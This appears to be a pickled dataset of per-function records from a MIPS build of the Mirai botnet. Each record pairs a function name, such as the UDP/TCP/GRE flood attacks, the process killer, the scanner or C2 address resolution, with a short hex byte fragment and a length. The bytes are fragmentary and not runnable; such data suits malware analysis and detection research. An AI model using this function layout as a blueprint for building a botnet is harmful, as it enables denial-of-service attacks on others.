(lp0
(S'_init'
p1
S'3c00279ca121bd00afbf00040000003c00279ca121000039dc2009000000000000003c00279ca021000039b02009000000000000e008'
p2
L140L
tp3
a(S'_ftext'
p4
S'3c00279ca021bd00afb11cb01891800000000000'
p5
L188L
tp6
a(S'frame_dummy'
p7
S'3c00279c9fe499e027bd00afbc8080'
p8
L128L
tp9
a(S'__start'
p10
S'0300040000003c00279c9f5403f821a50027a60001f803ff8f81afa200'
p11
L100L
tp12
a(S'attack_app_http'
p13
S'3c00279c9e'
p14
L9984L
tp15
a(S'attack_get_opt_str'
p16
S'300e300090a200100ca3009062040000460024002504fa0021e008e021000010'
p17
L84L
tp18
a(S'attack_get_opt_ip'
p19
S'3c0003ffafbf00afbc8180c603f809002100004000'
p20
L108L
tp21
a(S'attack_get_opt_int'
p22
S'3c0003ffafbf00afbc8180c603f80900214020'
p23
L108L
tp24
a(S'attack_start'
p25
S'3c0003ffafbf00b428b220b018998100a8300093b44b03f809'
p26
L396L
tp27
a(S'attack_parse'
p28
S'3c0003ffafbe0000b544afb440afb33cb238b030a288140024'
p29
L784L
tp30
a(S'attack_kill_all'
p31
S'3c0003'
p32
L132L
tp33
a(S'add_attack'
p34
S'3c0003ffafbf00afb324b220b01899'
p35
L180L
tp36
a(S'attack_init'
p37
S'3c0003ffafbf00afbc80851c0021200900210021200900'
p38
L256L
tp39
a(S'attack_gre_eth'
p40
S'3c0003ffbf00afb690afb58cb384b17cb078bc'
p41
L2012L
tp42
a(S'attack_gre_ip'
p43
S'3c0003ffafbe0000b56cafb468afb260afb15cafb058afbc'
p44
L1828L
tp45
a(S'attack_tcp_stomp'
p46
S'3c0003'
p47
L2372L
tp48
a(S'attack_tcp_ack'
p49
S'3c0003ffbf00afb6a0afb498afb394afb290afb18cbc'
p50
L2152L
tp51
a(S'attack_tcp_syn'
p52
S'3c0003ffbf00afb698afb594afb490afb38cb184bc'
p53
L2040L
tp54
a(S'attack_udp_plain'
p55
S'3c0003ffafbe0000b54cafb448afb344afb240afb13cb03899'
p56
L808L
tp57
a(S'attack_udp_generic'
p58
S'3c0003ffafbe0000b5afb460afb35cafb258afb154afb050afbc'
p59
L1460L
tp60
a(S'attack_udp_vse'
p61
S'3c0003ffafbe0000b554afb450afb34cafb248afb144afb040afbc'
p62
L1236L
tp63
a(S'attack_udp_dns'
p64
S'3c0003f7bf08afb698afb594afb490afb38cb184bc'
p65
L2112L
tp66
a(S'checksum_generic'
p67
S'2c001400003094'
p68
L92L
tp69
a(S'checksum_tcpudp'
p70
S'00008c1000'
p71
L172L
tp72
a(S'mem_exists'
p73
S'0000004021'
p74
L100L
tp75
a(S'killer_kill'
p76
S'3c000381440003002400'
p77
L32L
tp78
a(S'killer_kill_by_port'
p79
S'3c0003ddafbe2222b55cafb458afb354afb250afb14cafb048afbc81302802f80910'
p80
L2308L
tp81
a(S'killer_init'
p82
S'3c0003deafbf21afb70cb608b400b2f8afb1f4afb0'
p83
L2912L
tp84
a(S'anti_gdb_entry'
p85
S'3c000380'
p86
L32L
tp87
a(S'teardown_connection'
p88
S'3c0003'
p89
L100L
tp90
a(S'ensure_single_instance'
p91
S'3c0003ffafb344afb240afb13cb03899820201040205f80900214020'
p92
L568L
tp93
a(S'main'
p94
S'3c0003f970bf0688b6800678b374b270b16cafb068'
p95
L3324L
tp96
a(S'resolve_cnc_addr'
p97
S'3c0003'
p98
L324L
tp99
a(S'rand_next'
p100
S'3c0003808aa08f8002c01c0000188c25a802024310ad24a0ad0500ad42'
p101
L92L
tp102
a(S'rand_str'
p103
S'3c0003'
p104
L196L
tp105
a(S'rand_alphastr'
p106
S'3c0003ffafb34cafb248afb144afb040afbc8000241188003824008c008c00c40800ace20000ace50cc8e710001b0234538302044000'
p107
L320L
tp108
a(S'rand_init'
p109
S'3c0003'
p110
L172L
tp111
a(S'resolv_skip_name'
p112
S'3c'
p113
L156L
tp114
a(S'resolv_entries_free'
p115
S'3c0003ffafbf00afbc0000009980402003f809000000000021b0182008bd00b018e008'
p116
L108L
tp117
a(S'resolv_domain_to_hostname'
p118
S'3c0003'
p119
L176L
tp120
a(S'resolv_lookup'
p121
S'3c0003eef8afbf11afb7fcafb6f8afb5f4afb4'
p122
L1300L
tp123
a(S'consume_any_prompt'
p124
S'8c0024'
p125
L180L
tp126
a(S'can_consume'
p127
S'8c00431000280300'
p128
L24L
tp129
a(S'scanner_kill'
p130
S'3c0003818c03002400'
p131
L32L
tp132
a(S'deobf'
p133
S'3c0003'
p134
L184L
tp135
a(S'add_auth_entry'
p136
S'3c0003'
p137
L332L
tp138
a(S'setup_connection'
p139
S'3c0003ffafbf00b028'
p140
L284L
tp141
a(S'recv_strip_null'
p142
S'3c0003ffafbf00afbc830003f809a000180c4020022802182400a20014000000a0a50014'
p143
L120L
tp144
a(S'scanner_init'
p145
S'3c0003f860afbf0798afb794afb690afb58cb384b17cb078bc8103f809000040188f00'
p146
L7848L
tp147
a(S'table_retrieve_val'
p148
S'3c0003'
p149
L52L
tp150
a(S'toggle_obf'
p151
S'3c0003'
p152
L228L
tp153
a(S'table_lock_val'
p154
S'3c00038000273988200884'
p155
L32L
tp156
a(S'table_unlock_val'
p157
S'3c00038000273988200884'
p158
L32L
tp159
a(S'add_entry'
p160
S'3c0003ffafbf00b220b018998290000020008803f809a00000214028023003f8094098211084000002041300b324b220b018e008'
p161
L148L
tp162
a(S'table_init'
p163
S'3c0003ffafbf00afbc8080c5a51303f80900'
p164
L1444L
tp165
a(S'util_strlen'
p166
S'800040000000000014'
p167
L44L
tp168
a(S'util_strncmp'
p169
S'3c0003ffafbf00b220b01899'
p170
L208L
tp171
a(S'util_strcmp'
p172
S'3c0003'
p173
L192L
tp174
a(S'util_memcpy'
p175
S'1000003800000118240014'
p176
L44L
tp177
a(S'util_strcpy'
p178
S'3c0003'
p179
L116L
tp180
a(S'util_zero'
p181
S'1028a084010003000000'
p182
L32L
tp183
a(S'util_itoa'
p184
S'3c0003'
p185
L268L
tp186
a(S'util_memsearch'
p187
S'0050214000000024'
p188
L104L
tp189
a(S'util_stristr'
p190
S'3c0003'
p191
L236L
tp192
a(S'util_atoi'
p193
S'2400240024008001'
p194
L360L
tp195
a(S'util_fdgets'
p196
S'3c0003ffafbf00b630b428b220b0188000b000902100'
p197
L216L
tp198
a(S'util_local_addr'
p199
S'3c0003ffafbf00b030998103f809bc00'
p200
L228L
tp201
a(S'fcntl'
p202
S'3c0003'
p203
L136L
tp204
a(S'fcntl64'
p205
S'3c0003'
p206
L104L
tp207
a(S'chdir'
p208
S'3c0003ffafbf00afbcac009981002120090000500024'
p209
L88L
tp210
a(S'close'
p211
S'3c0003ffafbf00afbc'
p212
L84L
tp213
a(S'fork'
p214
S'3c0003ffafbf00afbca200009981002120090000500024'
p215
L84L
tp216
a(S'getpid'
p217
S'3c0003ffafbf00afbcb4000c9981002120090000500024'
p218
L84L
tp219
a(S'getppid'
p220
S'3c0003ffafbf00afbce0000c9981002120090000500024'
p221
L84L
tp222
a(S'ioctl'
p223
S'3c0003'
p224
L104L
tp225
a(S'kill'
p226
S'3c0003ffafbf00afbc'
p227
L88L
tp228
a(S'open'
p229
S'3c0003'
p230
L124L
tp231
a(S'creat'
p232
S'3c0003803003002403'
p233
L28L
tp234
a(S'prctl'
p235
S'3c0003'
p236
L120L
tp237
a(S'read'
p238
S'3c0003ffafbf00afbca3000c9981002120090000500024'
p239
L84L
tp240
a(S'readlink'
p241
S'3c0003ffafbf00afbcf5000c9981002120090000500024'
p242
L84L
tp243
a(S'select'
p244
S'3c0003'
p245
L120L
tp246
a(S'setsid'
p247
S'3c0003ffafbf00afbce2000c9981002120090000500024'
p248
L84L
tp249
a(S'sigprocmask'
p250
S'3c0003ffafbf00afbc'
p251
L148L
tp252
a(S'time'
p253
S'3c0003ffafbf00afbcad000c9981002120090000500024'
p254
L84L
tp255
a(S'unlink'
p256
S'3c0003ffafbf00afbcaa00009981002120090000500024'
p257
L84L
tp258
a(S'write'
p259
S'3c0003ffafbf00afbca4009981002120090000500024'
p260
L84L
tp261
a(S'closedir'
p262
S'3c0003ffafbf00b230b028808e00240027b318'
p263
L292L
tp264
a(S'opendir'
p265
S'3c0003ffbf00afb0b0bc800003f8090004000021004e009021402003f809a500'
p266
L408L
tp267
a(S'readdir'
p268
S'3c0003ffafbf00b02899818f3000f809a400'
p269
L256L
tp270
a(S'__errno_location'
p271
S'3c000380e00800'
p272
L24L
tp273
a(S'clock'
p274
S'3c0003ffafbf00'
p275
L108L
tp276
a(S'memset'
p277
S'280015801000002800402308030003c885008821c806000038003801302400ac85f814'
p278
L144L
tp279
a(S'memmove'
p280
S'3c0003ffafbf00afbc10002b800018'
p281
L816L
tp282
a(S'inet_addr'
p283
S'3c0003'
p284
L72L
tp285
a(S'accept'
p286
S'3c0003ffafbf00afbc10000c9981002120090000500024'
p287
L84L
tp288
a(S'bind'
p289
S'3c0003ffafbf00afbc10000c9981002120090000500024'
p290
L84L
tp291
a(S'connect'
p292
S'3c0003ffafbf00afbc10000c9981002120090000500024'
p293
L84L
tp294
a(S'getsockname'
p295
S'3c0003ffafbf00afbc10009981002120090000500024'
p296
L84L
tp297
a(S'getsockopt'
p298
S'3c0003'
p299
L120L
tp300
a(S'listen'
p301
S'3c0003ffafbf00afbc10000c9981002120090000500024'
p302
L84L
tp303
a(S'recv'
p304
S'3c0003ffafbf00afbc10000c9981002120090000500024'
p305
L84L
tp306
a(S'recvfrom'
p307
S'3c0003'
p308
L128L
tp309
a(S'send'
p310
S'3c0003ffafbf00afbc10000c9981002120090000500024'
p311
L84L
tp312
a(S'sendto'
p313
S'3c0003'
p314
L128L
tp315
a(S'setsockopt'
p316
S'3c0003'
p317
L120L
tp318
a(S'socket'
p319
S'3c0003ffafbf00afbc10000c9981002120090000500024'
p320
L84L
tp321
a(S'raise'
p322
S'3c0003ffafbf00afbc8000002009800228'
p323
L76L
tp324
a(S'sigaddset'
p325
S'3c0003ffafbf00'
p326
L104L
tp327
a(S'sigemptyset'
p328
S'3c0003ffafbf00'
p329
L60L
tp330
a(S'signal'
p331
S'3c0003feafbf01afbc'
p332
L252L
tp333
a(S'__sigismember'
p334
S'24'
p335
L40L
tp336
a(S'__sigaddset'
p337
S'24'
p338
L44L
tp339
a(S'__sigdelset'
p340
S'24'
p341
L48L
tp342
a(S'malloc'
p343
S'3c0003ffafbf00b020802c'
p344
L492L
tp345
a(S'calloc'
p346
S'3c0003'
p347
L180L
tp348
a(S'free'
p349
S'3c0003'
p350
L396L
tp351
a(S'realloc'
p352
S'3c0003ffafbf00afb324b220b018a098210000200900000000000514002400'
p353
L472L
tp354
a(S'__heap_alloc'
p355
S'8c'
p356
L188L
tp357
a(S'__heap_alloc_at'
p358
S'8c0024008c000000102400a82b000000150000'
p359
L184L
tp360
a(S'__heap_link_free_area'
p361
S'aca700c0aca6001000acc5048500e0020000000000'
p362
L44L
tp363
a(S'__heap_link_free_area_after'
p364
S'100000001000acc5048500e0'
p365
L28L
tp366
a(S'__heap_free'
p367
S'3c0003'
p368
L364L
tp369
a(S'atol'
p370
S'3c0003800021200800'
p371
L28L
tp372
a(S'strtol'
p373
S'3c00038103002400'
p374
L28L
tp375
a(S'_stdlib_strto_l'
p376
S'3c0003ffafbf00afb52cb428b220b018'
p377
L592L
tp378
a(S'exit'
p379
S'3c0003ffafbf00b02899818f0000f80900210000840900000000000000130003f8092021000000212009000000'
p380
L240L
tp381
a(S'sleep'
p382
S'3c0003'
p383
L564L
tp384
a(S'__uClibc_fini'
p385
S'3c0003ffafbf00afbc80800000230006008000002009000010ff10801824'
p386
L196L
tp387
a(S'__pthread_return_0'
p388
S'03000010'
p389
L8L
tp390
a(S'_pthread_cleanup_push_defer'
p391
S'03000000'
p392
L8L
tp393
a(S'__check_one_fd'
p394
S'3c0003'
p395
L136L
tp396
a(S'__uClibc_init'
p397
S'3c0003ffafbf008f008c34000000020181008f'
p398
L140L
tp399
a(S'__uClibc_main'
p400
S'3c0003ffbf00b39cafb298afb194afb090afbc10'
p401
L872L
tp402
a(S'sigaction'
p403
S'3c0003ffafb260afb15cafb058afbc80c0'
p404
L232L
tp405
a(S'__syscall_rt_sigaction'
p406
S'3c0003ffafbf00afbc10000c9981002120090000500024'
p407
L84L
tp408
a(S'_exit'
p409
S'3c0003'
p410
L80L
tp411
a(S'fstat'
p412
S'3c0003ffbf00bc0000282410000c99810021200900005000100024'
p413
L140L
tp414
a(S'__getdents'
p415
S'3c0003'
p416
L200L
tp417
a(S'__getdents64'
p418
S'3c0003'
p419
L452L
tp420
a(S'getegid'
p421
S'3c0003ffafbf00afbcd2000c9981002120090000500024'
p422
L88L
tp423
a(S'geteuid'
p424
S'3c0003ffafbf00afbcd1000c9981002120090000500024'
p425
L88L
tp426
a(S'getgid'
p427
S'3c0003ffafbf00afbccf00009981002120090000500024'
p428
L84L
tp429
a(S'getuid'
p430
S'3c0003ffafbf00afbc'
p431
L84L
tp432
a(S'lseek64'
p433
S'3c0003ffafbe21b020c027bd308f00c7e0a210000cbd81100000212009000004ff000300000080100000c38f00c203e828b020e008'
p434
L168L
tp435
a(S'nanosleep'
p436
S'3c0003ffafbf00afbc10000c9981002120090000500024'
p437
L84L
tp438
a(S'sbrk'
p439
S'3c0003'
p440
L144L
tp441
a(S'times'
p442
S'3c0003ffafbf00afbccb00009981002120090000500024'
p443
L84L
tp444
a(S'__xstat64_conv'
p445
S'3c0003'
p446
L288L
tp447
a(S'__xstat_conv'
p448
S'3c0003'
p449
L276L
tp450
a(S'memcpy'
p451
S'280015800003050011008828a800000011000038003801308c00aa008c008c008c002400ac88e089e48ae8ac'
p452
L308L
tp453
a(S'inet_aton'
p454
S'3c0003000058210a010029008000024000210030084000004021000524ff29011024840108c01043100018690046383008ff29044000140010000012100084016220400000000012002529050000140000000300240024000300acab0003000010'
p455
L244L
tp456
a(S'abort'
p457
S'3c0003'
p458
L428L
tp459
a(S'_dl_aux_init'
p460
S'3c000300'
p461
L44L
tp462
a(S'brk'
p463
S'3c0003ffafbf00'
p464
L112L
tp465
a(S'__do_global_ctors_aux'
p466
S'3c0003'
p467
L108L
tp468
a(S'_fini'
p469
S'3c0003ffafbc00bc0000003c000380000039202009000000000000e008'
p470
L92L
tp471
a.